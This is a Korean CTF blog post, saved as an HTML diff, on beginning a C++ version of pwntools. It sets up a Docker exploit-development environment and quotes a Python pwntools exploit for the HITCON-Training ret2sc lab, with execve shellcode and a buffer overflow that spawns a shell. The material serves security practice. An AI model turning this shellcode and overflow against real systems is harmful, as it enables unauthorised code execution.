@@ -1,0 +1,539 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.21.0 by Michael Rose
+  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Pwntools Cpp - Security Warehouse</title>
+<meta name="description" content="pwntools는 CTF에 관심있는 사람이라면 한번쯤은 들어봤을 법한 pwnable을 위한 전용 도구이다. (https://github.com/Gallopsled/pwntools)">
+
+
+  <meta name="author" content="lucid7">
+  
+  <meta property="article:author" content="lucid7">
+  
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Security Warehouse">
+<meta property="og:title" content="Pwntools Cpp">
+<meta property="og:url" content="https://lucid78.github.io/pwntools-cpp/">
+
+
+  <meta property="og:description" content="pwntools는 CTF에 관심있는 사람이라면 한번쯤은 들어봤을 법한 pwnable을 위한 전용 도구이다. (https://github.com/Gallopsled/pwntools)">
+
+
+
+
+
+
+
+  <meta property="article:published_time" content="2021-01-10T00:00:00+09:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="https://lucid78.github.io/pwntools-cpp/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "lucid7",
+      "url": "https://lucid78.github.io/"
+    
+  }
+</script>
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Security Warehouse Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css">
+
+<!--[if IE]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+    <nav class="skip-links">
+  <h2 class="screen-reader-text">Skip links</h2>
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+        <a class="site-title" href="/">
+          Security Warehouse
+          
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="https://mmistakes.github.io/minimal-mistakes/docs/quick-start-guide/">Quick-Start Guide</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">lucid7</h3>
+    
+    
+      <div class="author__bio" itemprop="description">
+        <p>Well, I still have music.</p>
+
+      </div>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Korea</span>
+        </li>
+      
+
+      
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Pwntools Cpp">
+    <meta itemprop="description" content="pwntools는 CTF에 관심있는 사람이라면 한번쯤은 들어봤을 법한 pwnable을 위한 전용 도구이다. (https://github.com/Gallopsled/pwntools)">
+    <meta itemprop="datePublished" content="2021-01-10T00:00:00+09:00">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Pwntools Cpp
+</h1>
+          
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          2 minute read
+        
+      </span>
+    
+  </p>
+
+
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        
+<p>pwntools는 CTF에 관심있는 사람이라면 한번쯤은 들어봤을 법한 pwnable을 위한 전용 도구이다. (<a href="https://github.com/Gallopsled/pwntools">https://github.com/Gallopsled/pwntools</a>)</p>
+
+<p>python으로 제작된 이 도구는 ctf에서 pwnable을 빠르게 진행할 수 있도록 각종 편의 기능을 보유하고 있어 매우 편리하다.
+만약 비교적 최근에 pwnable을 시작한 newbie라면 hexray(IDA)와 pwntools 없이는 pwnable이 불가능할 수도 있을만큼 필수적인 도구로 자리매김하고 있다.</p>
+
+<p>취미 생활로 CTF 풀이를 할 때마다 예전 버릇이 남아있어 주로 cpp로 exploit 코드를 작성하곤 했는데, 아무래도 pwntools가 엄청 편리한지라 라이브러리를 한번 찾아보게 되었다.
+github에 몇 개의 비슷한 프로그램이 있기는 했지만 딱히 마음에 드는 게 없어서 직접 만들어보기로 결심하였고, 모자란 기억을 보충하기 위해 개발 히스토리를 블로그에 남겨보고자 한다.</p>
+
+<p>가급적 노가다를 줄이기 위해 boost(<a href="https://www.boost.org/">https://www.boost.org/</a>)를 이용해 개발하기로 하였다.(사실 왜 boost로 시작했는지 잘 기억은 안나는데, 매뉴얼 및 사용층이 부족한 boost를 선택한 것이 과연 노가다를 줄이기는 한 건지 좀 의심되기는 한다;;;).
+그리고 프로그램의 테스트는 Hitcon-Trainning(<a href="https://github.com/scwuaptx/HITCON-Training">https://github.com/scwuaptx/HITCON-Training</a>) 문제를 사용하기로 했다.</p>
+
+<h3 id="환경-구축"><strong>환경 구축</strong></h3>
+
+<p>pwntoolcpp의 최종 형태는 라이브러리가 될  예정이지만 쉽고 빠르고 간단한 테스트를 위해 일단 하나의 프로그램에서 동작하도록 작성하기로 한다.
+~/workspaces 아래에 ptcpp라는 디렉토리를 생성하여 docker 실행 시 연결되도록 하고, 소스 에디팅은 Host에서, compile만 docker에서 하도록 하였다.</p>
+
+<p>아래 dockerfile과 run.sh를 이용해 테스트 환경을 구축하자.</p>
+
+<div class="language-docker highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">FROM</span><span class="s"> ubuntu:latest</span>
+
+<span class="k">ENV</span><span class="s"> DEBIAN_FRONTEND=noninteractive</span>
+
+<span class="k">RUN </span>apt-get update <span class="nt">--fix-missing</span> <span class="se">\
+</span>  <span class="o">&amp;&amp;</span> apt-get <span class="nt">-y</span> <span class="nb">install </span>locales <span class="se">\
+</span>  <span class="o">&amp;&amp;</span> locale-gen en_US.UTF-8 <span class="se">\
+</span>  <span class="o">&amp;&amp;</span> apt-get <span class="nt">-y</span> <span class="nb">install </span>gcc net-tools vim nano gdb python3 wget git make procps gcc-multilib socat cmake <span class="se">\
+</span>                       	libpcre3-dev libdb-dev libxt-dev libxaw7-dev curl binutils nasm bash-completion <span class="se">\
+</span>                       	build-essential software-properties-common g++-multilib libssl-dev apport <span class="se">\
+</span>                       	python3-pip python-dev netcat <span class="nb">sudo </span>libc6-dbg-i386-cross libc6-dbg telnet <span class="se">\
+</span>                        libc6-i386 libboost-all-dev <span class="se">\
+</span>  <span class="o">&amp;&amp;</span> adduser <span class="nt">--disabled-password</span> <span class="nt">--gecos</span> <span class="s1">''</span> guest <span class="se">\
+</span>  <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s1">'guest:guest'</span> | chpasswd <span class="se">\
+</span>  <span class="o">&amp;&amp;</span> wget <span class="nt">-O</span> /home/guest/.gdbinit-gef.py <span class="nt">-q</span> http://gef.blah.cat/py <span class="se">\
+</span>  <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">"source /home/guest/.gdbinit-gef.py"</span> <span class="o">&gt;</span> <span class="s2">"/home/guest/.gdbinit"</span> <span class="se">\
+</span>  <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">"catch exec"</span> | <span class="nb">cat</span> <span class="o">&gt;&gt;</span> /home/guest/.gdbinit <span class="se">\
+</span>  <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">"set follow-fork-mode child"</span> | <span class="nb">cat</span> <span class="o">&gt;&gt;</span> /home/guest/.gdbinit <span class="se">\
+</span>  <span class="o">&amp;&amp;</span> <span class="nb">chown </span>guest:guest /home/guest/.gdbinit-gef.py /home/guest/.gdbinit <span class="se">\
+</span>  <span class="o">&amp;&amp;</span> python3 <span class="nt">-m</span> pip <span class="nb">install</span> <span class="nt">--upgrade</span> pip <span class="se">\
+</span>  <span class="o">&amp;&amp;</span> python3 <span class="nt">-m</span> pip <span class="nb">install </span>pwntools <span class="se">\
+</span>  <span class="o">&amp;&amp;</span> python3 <span class="nt">-m</span> pip <span class="nb">install </span>setuptools <span class="se">\
+</span>  <span class="o">&amp;&amp;</span> python3 <span class="nt">-m</span> pip <span class="nb">install </span>capstone <span class="se">\
+</span>  <span class="o">&amp;&amp;</span> python3 <span class="nt">-m</span> pip <span class="nb">install </span>pwntools <span class="se">\
+</span>  <span class="o">&amp;&amp;</span> python3 <span class="nt">-m</span> pip <span class="nb">install </span>ropgadget <span class="se">\
+</span>  <span class="o">&amp;&amp;</span> curl https://bootstrap.pypa.io/get-pip.py <span class="nt">--output</span> get-pip.py <span class="se">\
+</span>  <span class="o">&amp;&amp;</span> python2 get-pip.py <span class="se">\
+</span>  <span class="o">&amp;&amp;</span> python2 <span class="nt">-m</span> pip <span class="nb">install </span>pwntools <span class="se">\
+</span>  <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">"%sudo ALL=(ALL:ALL) ALL"</span> | <span class="nb">cat</span> <span class="o">&gt;&gt;</span> /etc/sudoers <span class="se">\
+</span>  <span class="o">&amp;&amp;</span> usermod <span class="nt">-aG</span> <span class="nb">sudo </span>guest 
+
+<span class="k">RUN </span>dpkg <span class="nt">--add-architecture</span> i386 <span class="se">\
+</span>  <span class="o">&amp;&amp;</span> git clone https://github.com/scwuaptx/HITCON-Training /tmp/hitcon
+
+<span class="k">WORKDIR</span><span class="s"> /home/guest/ptcpp</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+
+<span class="nv">TAG</span><span class="o">=</span>build
+<span class="nv">HOME</span><span class="o">=</span>/home/lucid7 <span class="k">**</span>&lt;<span class="o">==</span> 수정 필요<span class="k">**</span>
+docker build <span class="nt">--tag</span> <span class="nv">$TAG</span> <span class="nb">.</span>
+docker run <span class="nt">--cap-add</span><span class="o">=</span>SYS_PTRACE <span class="se">\</span>
+           <span class="nt">--security-opt</span> <span class="nv">seccomp</span><span class="o">=</span>unconfined <span class="se">\</span>
+           <span class="nt">--name</span> <span class="nv">$TAG</span> <span class="se">\</span>
+           <span class="nt">--user</span> guest <span class="se">\</span>
+           <span class="nt">--hostname</span> <span class="nv">$TAG</span> <span class="se">\</span>
+           <span class="nt">--entrypoint</span> /bin/bash <span class="se">\</span>
+           <span class="nt">-it</span> <span class="se">\</span>
+           <span class="nt">--volume</span> <span class="nv">$HOME</span>/workspaces/ptcpp:/home/guest/ptcpp <span class="se">\</span>
+           <span class="nv">$TAG</span>
+</code></pre></div></div>
+
+<p>약간의 시간이 흐른 후 아래와 같이 docker 개발 환경 구축이 완성된다.
+<img src="/assets/images/docker.png" alt="full" /></p>
+
+<h3 id="문제-확인"><strong>문제 확인</strong></h3>
+
+<p>HITCON LAB3 문제를 확인해보자.
+해당 파일은 /tmp/hitcon 디렉토리 안에 위치해 있다.</p>
+
+<p>ret2sc.c 소스를 보면 아래와 같이 가장 기초적인 문제임을 알 수 있다.
+<img src="/assets/images/ret2sc.c.png" alt="full" /></p>
+
+<p>해당 문제를 검색해 보면 다음과 같은 풀이집이 있다. (<a href="https://ii4gsp.tistory.com/97">https://ii4gsp.tistory.com/97</a>)</p>
+
+<p>아래는 해당 풀이집에서 발췌한 pwntools를 이용한 exploit code이다.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">'/home/ii4gsp/HITCON-Training/LAB/lab3/ret2sc'</span><span class="p">)</span>
+<span class="n">shellcode</span> <span class="o">=</span> <span class="s">'</span><span class="se">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80</span><span class="s">'</span>
+<span class="n">name</span> <span class="o">=</span> <span class="mh">0x804a060</span>
+
+<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">':'</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s">''</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s">'</span><span class="se">\x90</span><span class="s">'</span> <span class="o">*</span> <span class="mi">32</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">':'</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>위의 python 코드를 보면 “:” 문자열이 나올때까지 출력을 읽어(recvuntil) 특정 값을 쓰는(sendline) 동작을 2번 반복한 다음 마지막으로 interactive() 함수를 호출한다.</p>
+
+<p>위의 exploit code에서 ret2sc 패스만 수정하여 실행해보면 아래와 같이 정상적으로 shell을 획득하는 것을 볼 수 있다.
+<img src="/assets/images/ret2sc.png" alt="full" /></p>
+
+<p>지금까지 cpp를 이용한 pwntools를 제작하기 위한 개발환경 구축 및 pwntools를 이용한 exploit 코드의 기본적인 동작을 분석하였다.
+다음 시간에는 위의 코드를 기반으로 pwntoolcpp를 제작해 볼 것이다.
+우리가 만들어야 할 기본 기능은 process라는 클래스와 recvuntil(), sendline(), p32(), interactive() 멤버 함수이다.</p>
+
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+
+
+        
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2021-01-10T00:00:00+09:00">January 10, 2021</time></p>
+
+
+      </footer>
+
+      <section class="page__share">
+  
+    <h4 class="page__share-title">Share on</h4>
+  
+
+  <a href="https://twitter.com/intent/tweet?text=Pwntools+Cpp%20https%3A%2F%2Flucid78.github.io%2Fpwntools-cpp%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Flucid78.github.io%2Fpwntools-cpp%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Flucid78.github.io%2Fpwntools-cpp%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+</section>
+
+
+      
+    </div>
+
+    
+  </article>
+
+  
+  
+    <div class="page__related">
+      <h4 class="page__related-title">You may also enjoy</h4>
+      <div class="grid__wrapper">
+        
+          
+            
+      </div>
+    </div>
+  
+</div>
+
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+  </form>
+  <div id="results" class="results"></div></div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+      <li><strong>Follow:</strong></li>
+    
+
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2021 lucid7. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+
+
+
+  </body>
+</html>
